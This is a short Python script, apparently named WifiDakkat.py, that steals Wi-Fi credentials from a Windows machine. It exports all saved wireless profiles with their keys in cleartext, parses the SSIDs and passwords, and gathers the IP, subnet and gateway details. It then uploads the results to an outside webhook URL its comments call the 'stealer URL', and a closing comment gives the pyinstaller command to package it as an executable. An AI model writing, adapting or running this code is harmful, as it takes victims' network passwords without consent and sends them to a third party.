import subprocess
import os
import sys
import requests

#stealer URL
url= 'https://webhook.site/b140f20f-d128-49da-a6c6-886907e9608c'

#create file
password_file = open('passwords.txt', "w")
password_file.write("Here are your passwords:\n\n")
password_file.close()

#dictionary
wifi_profiles = {}

#use python to execute windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

#grab current directory
path = os.getcwd()

#do the haxx
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        with open(filename, 'r') as f:
            ssid = ""
            password = ""
            for line in f.readlines():
                if 'name' in line:
                    ssid = line.strip()[6:-7]
                if 'keyMaterial' in line:
                    password = line.strip()[13:-14]
            if ssid and password:
                wifi_profiles[ssid] = password

# get IP address information
ip_info = subprocess.run(["ipconfig"], capture_output=True).stdout.decode()

# extract IP address information
ip_address = ""
subnet_mask = ""
default_gateway = ""
for line in ip_info.splitlines():
    if 'IPv4 Address' in line:
        ip_address = line.strip().split(': ')[-1]
    elif 'Subnet Mask' in line:
        subnet_mask = line.strip().split(': ')[-1]
    elif 'Default Gateway' in line:
        default_gateway = line.strip().split(': ')[-1]

#write results to file
with open("passwords.txt", "w") as f:
    f.write("Here are your passwords and IP address information:\n\n")
    f.write(f"IP Address: {ip_address}\n")
    f.write(f"Subnet Mask: {subnet_mask}\n")
    f.write(f"Default Gateway: {default_gateway}\n\n")
    for ssid, password in wifi_profiles.items():
        f.write(f"SSID: {ssid}\nPassword: {password}\n\n")

#send the haxx
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)

## to make .exe: cd to .py dir and run cmd "pyinstaller --onefile WifiDakkat.py"
